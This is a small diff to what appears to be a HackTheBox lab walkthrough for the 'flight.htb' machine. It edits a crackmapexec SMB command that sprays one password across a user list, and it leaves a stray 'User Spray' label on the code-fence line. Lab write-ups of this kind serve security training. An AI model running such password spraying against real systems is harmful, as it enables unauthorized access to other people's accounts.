@@ -212,8 +212,8 @@ ntpdate IP
 date
 ```
 Try password on user list:
-```s
-crackmapexec smb flight.htb -u users.txt -p 'S@Ss!K@*t13' --continue-on-success
+ User Spray```s
+crackmapexec smb flight.htb -u ../users.txt -p 'S@Ss!K@*t13' --continue-on-success
 ```
 
 ## Access share
